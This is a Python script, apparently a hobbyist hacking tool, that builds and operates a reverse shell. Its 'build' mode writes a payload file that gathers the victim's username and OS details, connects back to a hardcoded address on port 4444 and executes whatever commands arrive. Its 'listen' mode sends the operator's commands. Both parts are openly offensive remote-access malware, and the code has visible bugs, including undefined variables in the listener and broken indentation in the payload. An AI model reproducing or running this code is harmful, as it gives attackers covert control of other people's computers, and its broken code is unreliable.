import argparse
import subprocess
from socket import *
parser = argparse.ArgumentParser()        
parser.add_argument("-m", "--mode", type=str, help="Which mode or function to execute: build or listen")
parser.add_argument("-lh","--lhost",type=str, help="LHOST")
parser.add_argument("-lp","--lport",type=int, help="LPORT")
args = parser.parse_args()
lhost = args.lhost
lport = args.lport
if args.mode == "build":
    with open("payload.py","w") as payload_file:
        payload = "\n from socket import *\n\n from getpass import getuser\n\n import subprocess\n\n import platform\n\n import os\n# fetch victim information\n\n get_os = platform = platform.uname()\n\n get_user = getuser()\n\n os_info = 'client_name: '+str(get_user)+' <-> '+'client_os: '+str(get_os)\n# Lhost and lport\n\n HOST = '192.168.18.16'\n\n PORT = 4444\n# connection configuration\n\n connection = socket(AF_INET, SOCK_STREAM)\n\n connection.connect((HOST, PORT))\n\n connection.send(os_info.encode())\n# payload execution\n\n while True:\n    receiver = connection.recv(1024).decode()\n    if receiver == 'exit':\n        exit()\n    elif receiver[:2] == 'cd':\n        os.chdir(receiver[3:])\n        connection.send(os.getcwd().encode())\n    else:\n        out_put = subprocess.getoutput(receiver)\n        if out_put =='' or out_put == None:\n            output='----'\n            connection.send(out_put.encode())\n        else:\n            connection.send(out_put.encode())"
        payload_file.write(payload)
        print("Payload file created")
elif args.mode == "listen":
    connection = socket(AF_INET, SOCK_STREAM)
    connection.bind((HOST, PORT))
    # listen and receive the connection
    connection.listen(1)
    client, addr = connection.accept()
    print("connection -> " + str(addr))
    #payload delivery
    while True:
        receiver = client.recv(1024).decode()
        print(receiver)
        cmd = input("-> ")
        if cmd == "exit":
            client.send(cmd.encode)
        elif cmd == "" or cmd == None:
            cmd = "----"
            client.send(cmd.encode())
        else:
            client.send(cmd.encode())